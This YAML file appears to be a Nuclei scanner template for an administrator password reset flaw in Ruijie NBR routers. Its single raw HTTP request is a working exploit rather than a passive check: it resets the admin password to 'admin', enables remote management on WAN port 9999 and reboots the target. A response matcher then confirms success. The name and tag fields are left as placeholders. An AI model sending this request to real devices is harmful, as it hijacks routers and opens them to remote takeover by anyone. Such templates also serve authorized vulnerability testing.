id: ruijie-nbr-network-restpasswd
info:
  name: Template Name
  author: wangzong
  severity: info
  description: 锐捷NBR系列多款路由器base_network.asp存在管理员密码重置漏洞，攻击者通过漏洞重置密码登录后台,重置密码为 admin
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7NBR%E7%B3%BB%E5%88%97%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
        Connection: close
    matchers:
      - type: word
        part: body
        words:
          - '{"ret":0,"msg":"ok"}'
